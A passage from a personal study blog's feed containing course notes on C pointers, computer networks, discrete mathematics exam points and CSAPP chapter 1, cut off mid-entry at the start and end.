&amp;x;</code>赋值时<code>p=&amp;x</code>，<code>*p=x</code>，以及同类型变量互相赋值，这些选项是正确的。</p><h3 id="指针和数组"><a class="markdownIt-Anchor" href="#指针和数组"></a> 指针和数组</h3><p>C语言中很多特性都共享相似的形式，指针和数组就是这样。</p><p>一般而言数组名<code>a</code>代表数组本身，类型是<code>int [SIZE]</code>，但把若<code>a</code>看作指针，则它指向数组的第0个单元，指针类型是<code>int *</code>，指针所指向的类型是数组单元的类型，即<code>int</code>，可以记住以下等式<code>a=&amp;a[0]</code>,<code>*a=a[0]</code>。</p><h3 id="指针和函数"><a class="markdownIt-Anchor" href="#指针和函数"></a> 指针和函数</h3><ul><li>参数为指针</li><li>参数为数组</li><li>函数返回值为指针</li></ul><h3 id="指针和字符串"><a class="markdownIt-Anchor" href="#指针和字符串"></a> 指针和字符串</h3><h3 id="深入阅读"><a class="markdownIt-Anchor" href="#深入阅读"></a> 深入阅读</h3><p>《C Primer Plus》(微信读书即可方便阅读)</p><p><a href="https://nettee.github.io/posts/2018/Understanding-lvalues-and-rvalues-in-C-and-C">理解 C/C++ 中的左值和右值</a></p><p><a href="https://www.cnblogs.com/zlcxbb/p/6576153.html">指针超强汇总</a></p>]]></content>
    
    
    <categories>
      
      <category>编程语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Computer Networks</title>
    <link href="/2020/11/01/Network/"/>
    <url>/2020/11/01/Network/</url>
    
    <content type="html"><![CDATA[<h2 id="introduction"><a class="markdownIt-Anchor" href="#introduction"></a> Introduction</h2><p><strong>distributed system</strong> VS <strong>computer networks</strong></p><p>key distinction : <strong>middleware</strong></p><p>a distributed system is a <em>software</em> system built on top of a network</p><h3 id="uses"><a class="markdownIt-Anchor" href="#uses"></a> Uses</h3><h4 id="business-applications"><a class="markdownIt-Anchor" href="#business-applications"></a> Business Applications</h4><p><strong>resource sharing</strong></p><ul><li>VPNs</li><li>client-server model</li></ul><p><strong>commuinication medium</strong></p><ul><li>email</li><li>VoIP</li><li>desktop sharing</li></ul><p><strong>e-commerce</strong></p><h4 id="home-applications"><a class="markdownIt-Anchor" href="#home-applications"></a> Home Applications</h4><p><strong>Metcalfe’s law</strong> hypothesizes the value of a network</p><ul><li>P2P communication</li><li>social network</li><li>access information</li></ul><h4 id="mobile-users"><a class="markdownIt-Anchor" href="#mobile-users"></a> Mobile Users</h4><ul><li>RFID</li><li>Sensor networks</li><li>Wearable computers</li></ul><p>Wireless? * Mobile? = 4 types</p><h3 id="network-hardware"><a class="markdownIt-Anchor" href="#network-hardware"></a> Network Hardware</h3><p>two dimensions to classify: <strong>transmission technology</strong> and <strong>scale</strong></p><p>By transmission technology : <strong>broadcast</strong> links and <strong>point-to-point</strong> links</p><ul><li><p>broadcast</p><ul><li>channel shared by all machines on network</li><li>any packets received by all</li><li>address field within packet specifies intended recipient</li></ul></li><li><p>point-to-point</p><ul><li>first visit intermediate machines</li><li>multiple routes of different lengths</li></ul></li></ul><p>By scale : PAN, LAN, MAN, WAN, internetwork</p><h4 id="peronal-area-network"><a class="markdownIt-Anchor" href="#peronal-area-network"></a> Peronal Area Network</h4><ul><li>Bluetooth</li><li>RFID</li></ul><h4 id="local-area-network"><a class="markdownIt-Anchor" href="#local-area-network"></a> Local Area Network</h4><ul><li><p>Wireless LANs</p><ul><li>Device : AP (Access Point), wireless router,  base station<ul><li>relay packets between computers</li></ul></li><li>Standard : IEEE 802.11 (WiFi)<ul><li>Speed: from 11 to hundreds of Mbps</li></ul></li></ul></li><li><p>Wired LANs</p><ul><li>Device : copper wires or optical fiber</li><li>Standard : IEEE 802.3 (Ethernet)<ul><li>switched Ethernet</li><li>topology built from P2P links<ul><li>a switch has multiple ports</li></ul></li></ul></li></ul></li><li><p>VLAN</p><ul><li>divide one physical LAN into two smaller logical LANs</li></ul></li></ul><p>Both wireless and wired broadcast networks can be divided into <strong>static</strong> and <strong>dynamic</strong> designs, depending on how the channel is located.</p><p><strong>Power-line network</strong> : reuse electronic wires already installed, carry both power and data signals simultaneously, using different frequency bands</p><h4 id="metropolitan-area-network"><a class="markdownIt-Anchor" href="#metropolitan-area-network"></a> Metropolitan Area Network</h4><ul><li>cable television networks</li><li>IEEE 802.16 (<strong>WiMAX</strong>)</li></ul><h4 id="wide-area-network"><a class="markdownIt-Anchor" href="#wide-area-network"></a> Wide Area Network</h4><ul><li><p><strong>hosts</strong></p></li><li><p><strong>communication subnet</strong></p><ul><li><strong>subnet</strong> here only means <u>a collection of lines and routers</u></li><li>transmission lines<ul><li>move bits between machines</li><li>made of copper wire, optical fiber or radio links</li></ul></li><li>switching elements (<strong>router</strong>)<ul><li>specialized computers connecting transmission lines</li></ul></li></ul><p>WAN is not a large wired LAN ! Differences:</p><ul><li>In a WAN, hosts and subnet are owned and operated by different people, leading to <u>seperation of communication aspects(subnet) from application aspects(hosts)</u>, which simplifies the overall network design</li><li>Many WANs are actually <strong>internetworks</strong> because routers usually <u>connect different kinds of networking technology</u>.</li></ul><p>Varieties of WANs</p><ul><li>VPN<ul><li>link via Internet rather than lease dedicated lines</li><li>Pro : flexible reuse of resource</li><li>Con : lack of control over underlying resources</li></ul></li><li>ISP network</li></ul><p><strong>routing algorithm</strong> : which path to use</p><p><strong>forwarding algorithm</strong> : where to send a packet next</p><p>cellular telephone network and its three generations</p><ul><li>1st : analog + voice only</li><li>2nd : digital + voice only</li><li>3rd : digital + voice and data</li></ul></li></ul><h4 id="internetworks"><a class="markdownIt-Anchor" href="#internetworks"></a> Internetworks</h4><p>subnets, networks and internetworks are often confused.</p><p>network = a subnet + its hosts</p><p><strong>gateway</strong> : the gernal name for a machine making connections between networks and providing necessary translation, both in terms of hardware and software</p><p>Gateway cannot be too low-level or too high-level (Why? P51). It is in the middle level which is often called network layer. A router is a gateway switching packets at the network layer.</p><h3 id="network-software"><a class="markdownIt-Anchor" href="#network-software"></a> Network Software</h3><h4 id="protocol-hierarchies"><a class="markdownIt-Anchor" href="#protocol-hierarchies"></a> Protocol Hierarchies</h4><p>most networks are organized as a stack of <strong>layers</strong> or <strong>levels</strong></p><p>purpose of each layer ?<br />offer services to higher layers, shield layers from details of implement</p><p>the fundamental idea : a particular piece of software or hardware provide services to users but keeps details of its internal state and algorithms<br />known as information hiding, abstract data type, data encapsulation, object-oriented programming</p><p>layer <em>n</em> <strong>protocol</strong></p><p>peers : entities comprising the corresponding layers on different machines</p><p><strong>interface</strong> defines which primitive operations and services the low layer makes available to the upper one</p><p><strong>network architecture</strong> is a set of layers and protocols</p><p><strong>protocol stack</strong> is a list of protocols used by a certain system, one protocol per layer</p><h4 id="design-issues-for-the-layers"><a class="markdownIt-Anchor" href="#design-issues-for-the-layers"></a> Design Issues for the Layers</h4><h4 id="connection-oriented-vs-connectionlss-service"><a class="markdownIt-Anchor" href="#connection-oriented-vs-connectionlss-service"></a> Connection-Oriented VS Connectionlss Service</h4>]]></content>
    
    
    <categories>
      
      <category>计算机理论</category>
      
    </categories>
    
    
    <tags>
      
      <tag>长期</tag>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Discrete Math</title>
    <link href="/2020/10/30/Discrete-Math/"/>
    <url>/2020/10/30/Discrete-Math/</url>
    
    <content type="html"><![CDATA[<p>主要列出历年卷中出现的部分知识点，不完备，仅供个人参考</p><h2 id="集合"><a class="markdownIt-Anchor" href="#集合"></a> 集合</h2><p>空集的理解，属于和包含于</p><h2 id="命题逻辑"><a class="markdownIt-Anchor" href="#命题逻辑"></a> 命题逻辑</h2><h4 id="理解"><a class="markdownIt-Anchor" href="#理解"></a> 理解</h4><p>命题的概念（时空可知、未知量）</p><p>复合命题注意语法陷阱</p><h4 id="运用"><a class="markdownIt-Anchor" href="#运用"></a> 运用</h4><p>主范式演算证明</p><p>推理的三种方法</p><p>析取式(p或q)，合取式(p且q)</p><p>简单析/合取式：由有限个文字构成的析/合取式</p><p>析取范式：由有限个简单合取式构成的析取式 合取范式：由有限个简单析取式构成的合取式<br />(求范式：1.化联结词 2.双重否定消去否+德摩根律内移否 3.分配律)</p><p>极大项：含n个命题变项的简单析取式，每个命题变项和其否定不同时出现，二者之一必出现且仅出现一次，第i个命题变项或其否定出现在从左算起第i位上<br />极小项：含n个命题变项的简单合取式，每个命题变项和其否定不同时出现，二者之一必出现且仅出现一次，第i个命题变项或其否定出现在从左算起第i位上<br />(记忆：极大项只有一个成假赋值，所以是析取式)</p><p>主析取范式：n个命题变项构成的析取范式中所有简单合取式都是极小项<br />主合取范式：n个命题变项构成的析取范式中所有简单合取式都是极大项<br />(求主范式：1.先求范式 2.所有简单式展开长度为n 3.消重复 4.按角标从小到大排序)<br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∑</mo><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>5</mn><mo stretchy="false">)</mo><mi mathvariant="normal">表</mi><mi mathvariant="normal">示</mi><mi mathvariant="normal">主</mi><mi mathvariant="normal">析</mi><mi mathvariant="normal">取</mi><mi mathvariant="normal">范</mi><mi mathvariant="normal">式</mi><msub><mi>m</mi><mn>1</mn></msub><mo>∨</mo><msub><mi>m</mi><mn>3</mn></msub><mo>∨</mo><msub><mi>m</mi><mn>5</mn></msub><mspace width="1em"/><mo>∏</mo><mo stretchy="false">(</mo><mn>2</mn><mo separator="true">,</mo><mn>4</mn><mo stretchy="false">)</mo><mi mathvariant="normal">表</mi><mi mathvariant="normal">示</mi><mi mathvariant="normal">主</mi><mi mathvariant="normal">合</mi><mi mathvariant="normal">取</mi><mi mathvariant="normal">范</mi><mi mathvariant="normal">式</mi><msub><mi>m</mi><mn>2</mn></msub><mo>∧</mo><msub><mi>m</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">\sum(1,3,5)表示主析取范式m_1\vee m_3\vee m_5\quad\prod(2,4)表示主合取范式 m_2\wedge m_4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">5</span><span class="mclose">)</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord cjk_fallback">主</span><span class="mord cjk_fallback">析</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">范</span><span class="mord cjk_fallback">式</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7055600000000001em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∏</span><span class="mopen">(</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mclose">)</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord cjk_fallback">主</span><span class="mord cjk_fallback">合</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">范</span><span class="mord cjk_fallback">式</span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br />主析取范式中极小项的个数即为成真赋值的个数，主合取范式中极大项的个数即为成假赋值的个数</p><h2 id="谓词逻辑"><a class="markdownIt-Anchor" href="#谓词逻辑"></a> 谓词逻辑</h2><h4 id="理解-2"><a class="markdownIt-Anchor" href="#理解-2"></a> 理解</h4><p>个体词、谓词、量词 常项变项</p><p>单独的谓词不是完整命题，谓词填式：谓词字母后填以客体所得式</p><p>个体域(论域):个体变项的取值范围</p><p>全总个体域</p><p>一阶语言及其字母表</p><p>原子公式</p><p>合式公式(谓词公式)，简称公式</p><p>指导变元、量词的辖域 指导变元的<strong>约束出现</strong>/<strong>自由出现</strong></p><p><strong>闭式</strong>(不含自由个体变项)，在给定的解释中变成命题</p><h4 id="运用-2"><a class="markdownIt-Anchor" href="#运用-2"></a> 运用</h4><p>命题符号化，正确使用特性谓词</p><p>求前束范式</p><h2 id="关系"><a class="markdownIt-Anchor" href="#关系"></a> 关系</h2><h4 id="理解-3"><a class="markdownIt-Anchor" href="#理解-3"></a> 理解</h4><p>关系的性质（自反、对称、传递）的定义和表示（集合表达式、关系矩阵、关系图三种形式）</p><p>等价关系（自反&amp;对称&amp;传递）</p><p>等价类：A中与x等价的全体元素构成的子集</p><p>商集(A/R)：A上全体等价类构成的集合称作A关于R的商集</p><p>哈斯图</p><h4 id="运用-3"><a class="markdownIt-Anchor" href="#运用-3"></a> 运用</h4><p>求 自反/对称闭包</p><p>Warshall算法求传递闭包t®的关系矩阵（第i行加在第i列中1所在行上）</p><p>画偏序集的哈斯图，求最大(小)元、极大(小)、上(下)确界</p><h2 id="函数"><a class="markdownIt-Anchor" href="#函数"></a> 函数</h2><h4 id="理解-4"><a class="markdownIt-Anchor" href="#理解-4"></a> 理解</h4><p>单射（入射）、满射（到上映射）、双射的定义</p><p>是否具有传递性</p><p>前域、值域、共域</p><h2 id="图"><a class="markdownIt-Anchor" href="#图"></a> 图</h2><h4 id="理解-5"><a class="markdownIt-Anchor" href="#理解-5"></a> 理解</h4><p>k(G), λ(G), δ(G) 分别是？  点连通度，边连通度，最小度</p><p>生成子图    导出子图(两种)</p><p>二部图</p><h4 id="运用-4"><a class="markdownIt-Anchor" href="#运用-4"></a> 运用</h4><p>求最小生成树</p><p>哈密尔顿图的判定</p><ul><li>充分条件:<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mo stretchy="false">(</mo><mi>u</mi><mo stretchy="false">)</mo><mo>+</mo><mi>d</mi><mo stretchy="false">(</mo><mi>v</mi><mo stretchy="false">)</mo><mo>≥</mo><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">d(u)+d(v)≥n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">u</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>；推论：无限简单图最小度达点半数则是哈密顿图</li><li>必要条件:<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>G</mi><mo>−</mo><msub><mi>V</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>≤</mo><mi mathvariant="normal">∣</mi><msub><mi>V</mi><mn>1</mn></msub><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">p(G-V_1)≤|V_1|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">G</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span></span></span></span>；推论：有割点必非哈密顿图</li></ul><p>平面图的判定</p><ul><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>≤</mo><mfrac><mi>l</mi><mrow><mi>l</mi><mo>−</mo><mn>2</mn></mrow></mfrac><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="normal">每</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">面</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">次</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">至</mi><mi mathvariant="normal">少</mi><mi mathvariant="normal">为</mi><mi>l</mi></mrow><annotation encoding="application/x-tex">m\leq \frac{l}{l-2}(n-2),每个面的次数至少为l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.283439em;vertical-align:-0.403331em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span><span class="mbin mtight">−</span><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.403331em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">每</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">至</span><span class="mord cjk_fallback">少</span><span class="mord cjk_fallback">为</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span></span></span></span></li><li>必不含<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>K</mi><mrow><mn>3</mn><mo separator="true">,</mo><mn>3</mn></mrow></msub></mrow><annotation encoding="application/x-tex">K_{3,3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mpunct mtight">,</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>K</mi><mn>5</mn></msub></mrow><annotation encoding="application/x-tex">K_5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li></ul><h2 id="代数系统"><a class="markdownIt-Anchor" href="#代数系统"></a> 代数系统</h2><h4 id="理解-6"><a class="markdownIt-Anchor" href="#理解-6"></a> 理解</h4><p>二元运算 运算律</p><p>特异元 子代数</p><p>有限循环群</p><h4 id="运用-5"><a class="markdownIt-Anchor" href="#运用-5"></a> 运用</h4><p>证明半群/独异点/群的在同态映射f下的同态像也是半群/独异点/群</p><p>写出生成元和子群，画子群格</p><p>证明H是G的子群</p><ul><li>证明e∈H，得H非空</li><li>证明a*b<sup>-1</sup>∈H（常见交换律，用交换证明逆元也具交换律即可）</li></ul><p>群的性质</p>]]></content>
    
    
    <categories>
      
      <category>课内</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Math</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP</title>
    <link href="/2020/10/28/CSAPP/"/>
    <url>/2020/10/28/CSAPP/</url>
    
    <content type="html"><![CDATA[<p><a href="http://csapp.cs.cmu.edu/3e/students.html">Site</a>  <a href="http://csapp.cs.cmu.edu/3e/labs.html">Labs</a> <a href="http://csapp.cs.cmu.edu/3e/figures.html">Figures</a> <a href="https://www.bilibili.com/video/BV1iW411d7hd">Lecture</a></p><h2 id="ch1-a-tour-of-computer-systems"><a class="markdownIt-Anchor" href="#ch1-a-tour-of-computer-systems"></a> Ch1  A Tour of Computer Systems</h2><h3 id="information-is-bitscontext"><a class="markdownIt-Anchor" href="#information-is-bitscontext"></a> Information Is Bits+Context</h3><p><strong>text files</strong> consist exclusively of ASCII characters<br />All other files are known as <strong>binary files</strong></p><h3 id="compilation-system"><a class="markdownIt-Anchor" href="#compilation-system"></a> Compilation system</h3><ul><li><p>preprocessor</p><p>insert header file to program text, creating another file <em>program.i</em></p></li><li><p>compiler</p><p>text file <em>program.i</em> to <em>program.s</em> (assembly program)</p></li><li><p>assembler</p><p><em>program.s</em> to machine-language instructions, packaged in a form called <strong>relocatable</strong> object program</p></li><li><p>linker</p><p>merge .o files to <strong>executable</strong></p></li></ul><h3 id="hardware-organization"><a class="markdownIt-Anchor" href="#hardware-organization"></a> Hardware Organization</h3><ul><li><p>Buses</p><ul><li>carry information between components</li><li>chunks of bytes in fixed-size are called <strong>word</strong></li><li><strong>word size</strong> varies across systems (commonly 4 bytes or 8 bytes)</li></ul></li><li><p>I/O Devices</p><ul><li>connected to the I/O bus by <strong>controller</strong> or <strong>adapter</strong><ul><li>controllers are chip sets in the device itself or on the system’s main printed circuit board(<strong>motherboard</strong>)</li><li>adapter is a card that plugs into a slot on the motherboard</li></ul></li></ul></li><li><p>Main Memory</p><ul><li>consist of a collection of <strong>DRAM</strong>(dynamic random access memory)</li></ul></li><li><p>Processor</p><ul><li>the engine that interprets instructions stored in main memory</li><li>a word-size storage device called <strong>program counter</strong>(also PC) at its core, always pointing at machine-language instructions</li><li>processor <em>appears</em> to operate according to a simple instruction execution model, defined by its <strong>instruction set architecture</strong><ul><li>Load: copy from main memory into register</li><li>Store: copy from register to a location in main memory</li><li>Operate: copy contents of two registers to ALU, perform arithmetic operation on the two words, store result in register</li><li>Jump: extract word from instruction itself, copy that word into PC</li><li>(This kind of <em>copy</em> means <strong>overwriting</strong>!)</li></ul></li></ul></li></ul><h3 id="caches-matter"><a class="markdownIt-Anchor" href="#caches-matter"></a> Caches Matter</h3><p>the <em>processor-memory gap</em> : fast+small+expensive VS slow+large+cheap</p><p><em>memory hierarchy</em> : storage at one level serves as a cache for storage at the next lower level</p><p>Figure 1.9: Example of a seven-level memory hierarchy</p><h3 id="operating-system"><a class="markdownIt-Anchor" href="#operating-system"></a> Operating System</h3><p>primary purposes of OS : protect (? from ?) and provide (? with ?)</p><p>(like a paradox, P15)</p><p>Figure 1.10: <strong>Layered view</strong> of a computer system</p><p>Figure 1.11: <strong>Abstractions</strong> provided by an operating system</p><h5 id="processes"><a class="markdownIt-Anchor" href="#processes"></a> Processes</h5><p>Why can multiple processes run concurrently?  Instructions of processes are <strong>interleaved</strong>.</p><p>Figure 1.12: Process <strong>context switching</strong></p><p>What is <em>context</em>? (P16)</p><p>user : ask -&gt; pass control by invoking <em>system call</em><br />kernel : -&gt; save -&gt; restore -&gt; pass control<br />program : -&gt; run -&gt; terminate -&gt; return<br />system : restore -&gt; pass control back</p><p>Kernel is not a separate process but what? (P17)</p><h5 id="threads"><a class="markdownIt-Anchor" href="#threads"></a> Threads</h5><p>Although we normally think of a process as having a single control flow,in modern systems, a process can actually consist of <strong>multiple execution units</strong>, called <em>threads</em>, each running in the context of the process and sharing the same code and global data.</p><p>Easier to share data, more efficient, faster under multiprocesser than process</p><h5 id="virtual-memory"><a class="markdownIt-Anchor" href="#virtual-memory"></a> Virtual Memory</h5><p>abstraction … process … illusion … exclusive use of main memory</p><p>Figure 1.13: Process virtual address space</p><ul><li>Program code and data<ul><li>begins at same fixed address for all processes, followed by data locations</li></ul></li><li>Heap<ul><li>expand and contract dynamically <strong>at run time</strong> when <code>malloc</code> and <code>free</code></li></ul></li><li>Shared 